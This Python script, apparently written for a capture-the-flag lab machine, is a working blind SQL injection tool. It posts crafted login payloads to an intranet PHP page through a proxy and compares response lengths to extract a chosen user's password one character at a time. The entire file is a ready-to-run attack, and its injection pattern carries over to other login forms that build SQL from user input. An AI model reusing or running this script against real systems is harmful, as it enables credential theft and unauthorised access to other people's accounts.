#!/env/bin/python

import os
import requests
import sys


class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def postRequest(u, p):
    proxy = "http://10.10.10.200:3128"
    addr = "http://172.31.179.1/intranet.php"
    postdata = {"Username": u, "Password": p}
    response = requests.post(addr, data=postdata, proxies={"http": proxy})
    return response.text


def get_input():
    keywords = ['sarah', 'rita', 'jim', 'bryan', ]
    user_input = None
    try:
        while True:
            user_input = input("Enter username: ")
            if user_input in keywords:
                break
            else:
                print(
                    f"{bcolors.FAIL}Box have only four users and {user_input} is not the one out of four.{bcolors.ENDC}")
                continue
        return user_input
    except KeyboardInterrupt:
        print(f"{bcolors.WARNING}\nInterrupted{bcolors.ENDC}")
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)


def brute():
    # chars = "0123456789abcdefghijklmnopqrstuvwxyz!#%&()*+,-./:;<=>?@[\]^_{|}~$" # all chars
    chars = "sarh4evily0bugm!twonpd1$"  # only password chars for testing
    # users = ['sarah', 'rita', 'jim', 'bryan', ]
    users = [get_input()]

    try:
        for user in users:
            invalidlength = len(postRequest("test", "test"))
            pw = ''
            print('\nUsername :', user + "$")
            for i in range(1, 32):
                found = False
                for c in chars:
                    sys.stdout.write(f"\rPassword: {pw + c}")
                    payload = "' or Username ='" + user + "' and substring(Password," + str(i) + ",1)='" + c
                    response = postRequest('', payload)
                    if len(response) != invalidlength:
                        found = True
                        break
                if not found:
                    break
                sys.stdout.write(f"\rPassword: {pw}")
                pw += c
        print(f"{bcolors.OKGREEN}\nCompleted{bcolors.ENDC}")
    except KeyboardInterrupt:
        print(f"{bcolors.WARNING}\nInterrupted{bcolors.ENDC}")
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)


brute()

